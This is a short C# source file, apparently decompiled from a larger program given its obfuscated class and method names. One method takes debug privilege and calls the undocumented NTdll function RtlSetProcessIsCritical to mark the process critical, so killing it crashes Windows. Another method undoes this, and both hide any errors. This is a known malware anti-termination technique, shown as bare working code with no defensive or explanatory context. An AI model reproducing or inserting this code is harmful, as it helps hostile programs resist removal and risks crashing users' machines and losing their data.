using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ns11;

public class GClass11
{
	[DllImport("NTdll.dll", SetLastError = true)]
	public static extern void RtlSetProcessIsCritical([MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] ref bool bool_1, [MarshalAs(UnmanagedType.Bool)] bool bool_2);

	public static void smethod_0()
	{
		try
		{
			Process.EnterDebugMode();
			bool bool_ = default(bool);
			RtlSetProcessIsCritical(bool_0: true, ref bool_, bool_2: false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		try
		{
			bool bool_ = default(bool);
			RtlSetProcessIsCritical(bool_0: false, ref bool_, bool_2: false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
